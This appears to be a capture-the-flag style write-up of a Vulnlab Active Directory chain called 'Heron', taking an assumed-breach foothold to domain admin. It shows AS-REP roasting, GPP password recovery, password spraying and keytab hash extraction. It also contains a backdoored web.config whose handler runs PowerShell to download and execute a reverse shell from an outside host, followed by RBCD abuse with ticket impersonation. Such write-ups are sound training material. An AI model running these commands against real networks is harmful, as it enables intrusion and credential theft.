# Heron
![](images/heron.png)


IPs: `10.10.172.101` `10.10.172.102`

# Recon
This chain starts as an assumed breach with on ssh open on the 10.10.172.102 jump box.

We are given the following credentials:

```
pentest:Heron123!
```

Going to set up a socks proxy over ssh when logging in, which should be useful later on.
```
ssh -D 1080 pentest@10.10.172.102
****************************************************
*              Welcome to Heron Corp               *
*  Unauthorized access to 'frajmp.heron.vl' is     *
*  forbidden and will be prosecuted by law.        *
****************************************************
```

The ssh login gives us a host name also implying that the box is domain joined.

Checking the home directory shows two domain users:
```
svc-web-accounting-d@heron.vl
svc-web-accounting@heron.vl
```

Also checking where the dc with nslookup:
```
nslookup heron.vl
Server:         10.10.172.101
Address:        10.10.172.101#53

Name:   heron.vl
Address: 10.10.172.101
```

With this we can check for some common ports on the domain controller.
```
proxychains -q nmap -p 80,445,389,443 -sT heron.vl
Starting Nmap 7.95 ( https://nmap.org ) at 2024-10-05 17:27 AEST
Nmap scan report for heron.vl (10.10.172.101)
Host is up (0.29s latency).

PORT    STATE  SERVICE
80/tcp  open   http
389/tcp open   ldap
443/tcp closed https
445/tcp open   microsoft-ds

Nmap done: 1 IP address (1 host up) scanned in 16.17 seconds
```

Port 80:
Looking at the website gives us a more usernames:
```
wayne.wood
julian.pratt
samuel.davies
```

As we still dont have domain credentials we could try to asreproast:
```
proxychains -q GetNPUsers.py -no-pass -usersfile ~/vulnlab/heron/users.txt heron.vl/
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] User svc-web-accounting-d doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User svc-web-accounting doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User wayne.wood doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User julian.pratt doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$samuel.davies@HERON.VL:6296a0c3d3aa9db106b143d143218911$121b1d70524cbeab629efa0ced00e364c47a8bcafc39492a8dd3ab3abcb6bdf28da22ccbab2664624a17955966fa7d2fcb189b4f63ff0459adf65dba7062db5032e9072328601e68939506a2f52e39bb09eb708851e53bec778e48eb71e467a0beba13581c5cfcfd858820a91f4d6b3d9d232d98bc6b58b22e4ad8393d836572f4f0fb177600eb9715a7cd15cb54852ce874096a493865921c90e87e4e71d349db45f2e31d8953d04092f3d85bebacb453fa3520caaa45e4329658fb9eafc60fa269e18440625c476e449cf76ebe70d1ad72c3f361dbafe4b25ac37fe4a54c9f0d85755e
```

Cracking the hash with hashcat gives us domain creds!
```
samuel.davies:l6fkiy9oN
```

Checking the shares shows that there is an `accounting$` share that could be interesting.
```
proxychains -q nxc smb heron.vl -u samuel.davies -p l6fkiy9oN --shares
SMB         10.10.172.101   445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
SMB         10.10.172.101   445    MUCDC            [*] Enumerated shares
SMB         10.10.172.101   445    MUCDC            Share           Permissions     Remark
SMB         10.10.172.101   445    MUCDC            -----           -----------     ------
SMB         10.10.172.101   445    MUCDC            accounting$                     
SMB         10.10.172.101   445    MUCDC            ADMIN$                          Remote Admin
SMB         10.10.172.101   445    MUCDC            C$                              Default share
SMB         10.10.172.101   445    MUCDC            CertEnroll      READ            Active Directory Certificate Services share
SMB         10.10.172.101   445    MUCDC            home$           READ            
SMB         10.10.172.101   445    MUCDC            IPC$                            Remote IPC
SMB         10.10.172.101   445    MUCDC            it$                             
SMB         10.10.172.101   445    MUCDC            NETLOGON        READ            Logon server share 
SMB         10.10.172.101   445    MUCDC            SYSVOL          READ            Logon server share 
SMB         10.10.172.101   445    MUCDC            transfer$       READ,WRITE    
```

Also gives the hostname of `MUCDC.heron.vl`

As we can read the SYSVOL going to see if there is a gpp password.
```
proxychains -q nxc smb heron.vl -u samuel.davies -p l6fkiy9oN -M gpp_password
... snip ...
PP_PASS... 10.10.172.101       445    MUCDC            [+] Found credentials in heron.vl/Policies/{6CC75E8D-586E-4B13-BF80-B91BEF1F221C}/Machine/Preferences/Groups/Groups.xml
GPP_PASS... 10.10.172.101       445    MUCDC            Password: H3r0n2024#!
GPP_PASS... 10.10.172.101       445    MUCDC            action: U
GPP_PASS... 10.10.172.101       445    MUCDC            newName: _local
GPP_PASS... 10.10.172.101       445    MUCDC            fullName: 
GPP_PASS... 10.10.172.101       445    MUCDC            description: local administrator
GPP_PASS... 10.10.172.101       445    MUCDC            changeLogon: 0
GPP_PASS... 10.10.172.101       445    MUCDC            noChange: 0
GPP_PASS... 10.10.172.101       445    MUCDC            neverExpires: 1
GPP_PASS... 10.10.172.101       445    MUCDC            acctDisabled: 0
GPP_PASS... 10.10.172.101       445    MUCDC            subAuthority: RID_ADMIN
GPP_PASS... 10.10.172.101       445    MUCDC            userName: Administrator (built-in)
```

Going to password spray to see if this password has been reused as it looks like a generic domain password.
```
proxychains -q nxc ldap heron.vl -u ~/vulnlab/heron/users.txt -p 'H3r0n2024#!'
SMB         10.10.172.101       445    MUCDC            [*] Windows Server 2022 Standard 20348 x64 (name:MUCDC) (domain:heron.vl) (signing:True) (SMBv1:True)
LDAP        10.10.172.101       389    MUCDC            [+] heron.vl\svc-web-accounting-d:H3r0n2024#!
```

Checking shares again with this user shows that we can read and write to `accounting$`

In the share there is a `web.config` file. This can be used to backdoor the application and gain RCE in the context of the IIS server. This is a good post if you want more information: https://soroush.me/blog/2019/08/uploading-web-config-for-fun-and-profit-2/

As there is no need to do any fancy opsec stuff, I'm just going to `iex` a powershell revtcp oneliner. (not adding shell.ps1 as it triggers chromes AV scanner :|)

The new `web.config`:
```
cat web.config
<?xml version="1.0" encoding="utf-8"?>
<configuration>
  <location path="." inheritInChildApplications="false">
    <system.webServer>
      <handlers>
        <add name="aspNetCore" path="shell.me" verb="*" modules="AspNetCoreModuleV2" resourceType="Unspecified" />
      </handlers>
          <aspNetCore processPath="cmd.exe" arguments="/c powershell.exe iex(New-Object Net.WebClient).downloadString('http://IP:8080/shell.ps1')"/>
    </system.webServer>
  </location>
</configuration>
<!--ProjectGuid: 803424B4-7DFD-4F1E-89C7-4AAC782C27C4-->
```

So going to the path `gimmieshell.pls` should give us a rev shell back. The annoying thing is going to be doing this all via the socks proxy, as the webapp wont be able to talk directly to our box.

What we can do is open up 2 reverse port forwards from the jump box to us. One for the payload download, and the other for a shell.

At this stage I tried a few different ways to forward a port so I dont have to use the jump box to stage and catch a shell but nothing seemed to work.

As im still not sure what website this controls im going to quickly fuzz for vhosts:

```
ffuf -w /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -u http://heron.vl -H "Host: FUZZ.heron.vl" -x socks5://127.0.0.1:1080 -fw 1230

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0
________________________________________________

 :: Method           : GET
 :: URL              : http://heron.vl
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/DNS/subdomains-top1million-5000.txt
 :: Header           : Host: FUZZ.heron.vl
 :: Follow redirects : false
 :: Calibration      : false
 :: Proxy            : socks5://127.0.0.1:1080
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response words: 1230
________________________________________________

accounting              [Status: 401, Size: 0, Words: 1, Lines: 1, Duration: 4036ms]
```

Uploading the new web.config and using python3 and nc on the jump box to stage and catch the reverse shell. 

Then going to `http://accounting.heron.vl/shell.me` to trigger the payload.

This worked!! Now we are:
```
PS C:\webaccounting> whoami
heron\svc-web-accounting
```

The shell is super unstable but that doesnt matter as looking shows there is a file with ssh creds!
```
PS C:\windows\scripts> type ssh.ps1
$plinkPath = "C:\Program Files\PuTTY\plink.exe"
$targetMachine = "frajmp"
$user = "_local"
$password = "Deplete5DenialDealt"
& "$plinkPath" -ssh -batch $user@$targetMachine -pw $password "ps auxf; ls -lah /home; exit"
```

This user is also in the sudo group and can run ALL ALL as root.
```
_local@frajmp:~$ id
uid=1000(_local) gid=1000(_local) groups=1000(_local),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),110(lxd)
_local@frajmp:~$ sudo -l 
Matching Defaults entries for _local on localhost:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User _local may run the following commands on localhost:
    (ALL : ALL) ALL
```

Going to password spray again to see if there is password reuse.
```
proxychains -q nxc ldap heron.vl -u users.txt -p Deplete5DenialDealt
LDAP        10.10.172.101       389    MUCDC            [+] heron.vl\julian.pratt:Deplete5DenialDealt
```

Logging into the `home$` share as this user gives us more creds in a `.lnk` file.
```
adm_prju@mucjmp -pw ayDMWV929N9wAiB4
```

Now is probs a good time to run bloodhound.
```
proxychains -q ./bloodhound.py -d heron.vl -u adm_prju -p ayDMWV929N9wAiB4 -c all -ns 10.10.172.101 --zip -dc MUCDC.heron.vl
```

The domain admin is called `_admin` and the `adm_prju` user has WriteAccountRestrictions over the domain controller. This means we can configure RBCD for the DC and request a ticket on behalf of a domain admin.

As we have root on the linux box and its domain joined we can extract the ntlm hash from the `/etc/krb5.keytab` file then configure RBCD and request a ticket. 

```
python3 /opt/keytabextract.py krb5.keytab 
[*] RC4-HMAC Encryption detected. Will attempt to extract NTLM hash.
[*] AES256-CTS-HMAC-SHA1 key found. Will attempt hash extraction.
[*] AES128-CTS-HMAC-SHA1 hash discovered. Will attempt hash extraction.
[+] Keytab File successfully imported.
        REALM : HERON.VL
        SERVICE PRINCIPAL : FRAJMP$/
        NTLM HASH : 6f55b3b443ef192c804b2ae98e8254f7
        AES-256 HASH : 7be44e62e24ba5f4a5024c185ade0cd3056b600bb9c69f11da3050dd586130e7
        AES-128 HASH : dcaaea0cdc4475eee9bf78e6a6cbd0cd

proxychains -q rbcd.py -delegate-from 'FRAJMP$' -delegate-to 'MUCDC$' -dc-ip MUCDC.heron.vl -action write heron.vl/adm_prju:ayDMWV929N9wAiB4 
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Attribute msDS-AllowedToActOnBehalfOfOtherIdentity is empty
[*] Delegation rights modified successfully!
[*] FRAJMP$ can now impersonate users on MUCDC$ via S4U2Proxy
[*] Accounts allowed to act on behalf of other identity:
[*]     FRAJMP$      (S-1-5-21-1568358163-2901064146-3316491674-27101)

proxychains -q getST.py -spn 'cifs/MUCDC' -impersonate _admin -dc-ip MUCDC.heron.vl -hashes :6f55b3b443ef192c804b2ae98e8254f7 heron.vl/'FRAJMP$'
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[-] CCache file is not found. Skipping...
[*] Getting TGT for user
[*] Impersonating _admin
[*] Requesting S4U2self
[*] Requesting S4U2Proxy
[*] Saving ticket in _admin@cifs_MUCDC@HERON.VL.ccache
```

Then logging in with wmiexec:
```
KRB5CCNAME=$(pwd)/_admin@cifs_MUCDC@HERON.VL.ccache proxychains -q wmiexec.py heron.vl/_admin@MUCDC -k -no-pass
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] SMBv3.0 dialect used
[!] Launching semi-interactive shell - Careful what you execute
[!] Press help for extra shell commands
C:\>whoami
heron\_admin

C:\>hostname
mucdc
```


Fin

# Beyond Root
Very fun chain, really liked how you didnt really need to rely on any fancy AD tricks till the end. I wanted to try to backdoor the web.config file without having to override the current configuration of the webapp but couldnt find a way.

When looking at the way others solved the box the `ssh.ps1` file was unintended. The correct way was to use the `.krb5login` and to backdoor ssh to get the login password. You could also have used the aduit group that svc-web-accounting is in to set up rbcd on the jumpbox, which would have given root.

Someone also mentioned you can hijack the dll in the `accounting$` share and gain a shell that way.

As there is a bunch of stuff to try I'm going to leave it for now and post another write up later on going over this.
